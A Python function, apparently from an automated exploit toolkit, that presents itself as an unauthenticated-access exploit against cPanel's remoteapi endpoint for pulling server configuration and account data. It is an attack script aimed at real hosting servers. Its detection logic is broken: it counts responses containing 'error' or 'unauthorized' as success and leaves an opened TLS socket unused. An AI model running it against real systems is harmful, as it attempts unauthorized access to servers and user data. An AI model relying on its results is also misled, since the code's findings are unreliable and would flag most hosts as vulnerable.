def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploits cPanel's default authentication bypass via unauthenticated API access.
    cPanel versions prior to 11.52.0 allow unauthenticated access to certain API endpoints
    (e.g., /cpsessXXXXX/remoteapi) when the session cookie is missing or invalid.
    This works on cPanel/WHM installations where the remoteapi module is enabled
    and the server is configured to allow unauthenticated API calls (common in misconfigured setups).
    The vulnerability allows an attacker to retrieve sensitive information such as
    server configuration, user accounts, and potentially execute commands via API.
    """
    try:
        import socket
        import ssl
        import urllib.request
        import urllib.error
        import json
        import re

        # Try to connect via HTTPS (cPanel typically uses SSL)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with socket.create_connection((host, port), timeout=timeout) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                # Try to access the remoteapi endpoint without authentication
                # This is a known misconfiguration in older cPanel versions
                url = f"https://{host}:{port}/remoteapi"
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'Mozilla/5.0')
                
                try:
                    response = urllib.request.urlopen(req, timeout=timeout)
                    data = response.read().decode('utf-8')
                    
                    # Check if we got a response that indicates unauthenticated access
                    # cPanel remoteapi returns JSON with error messages when unauthenticated
                    if 'error' in data.lower() or 'unauthorized' in data.lower():
                        # Parse the response to extract useful information
                        try:
                            parsed_data = json.loads(data)
                            if isinstance(parsed_data, dict):
                                # Extract key information from the response
                                evidence = f"Unauthenticated access to cPanel remoteapi detected. Response: {data[:500]}"
                                return {
                                    "success": True,
                                    "data": parsed_data,
                                    "evidence": evidence
                                }
                        except (json.JSONDecodeError, ValueError):
                            # If not JSON, still report the finding
                            evidence = f"Unauthenticated access to cPanel remoteapi detected. Response: {data[:500]}"
                            return {
                                "success": True,
                                "data": data,
                                "evidence": evidence
                            }
                    else:
                        # If we got a different response, it might be a different endpoint
                        evidence = f"Access to cPanel remoteapi returned unexpected response: {data[:500]}"
                        return {
                            "success": True,
                            "data": data,
                            "evidence": evidence
                        }
                except urllib.error.HTTPError as e:
                    # HTTP error might indicate authentication is required
                    # But we can still check the response body
                    data = e.read().decode('utf-8')
                    if 'unauthorized' in data.lower() or 'forbidden' in data.lower():
                        evidence = f"cPanel remoteapi requires authentication (HTTP {e.code}). Response: {data[:500]}"
                        return {
                            "success": False,
                            "data": "",
                            "evidence": evidence
                        }
                    else:
                        evidence = f"cPanel remoteapi returned HTTP {e.code}. Response: {data[:500]}"
                        return {
                            "success": False,
                            "data": "",
                            "evidence": evidence
                        }
                except Exception as e:
                    evidence = f"Error accessing cPanel remoteapi: {str(e)}"
                    return {
                        "success": False,
                        "data": "",
                        "evidence": evidence
                    }
    except Exception as e:
        evidence = f"Error connecting to cPanel service: {str(e)}"
        return {
            "success": False,
            "data": "",
            "evidence": evidence
        }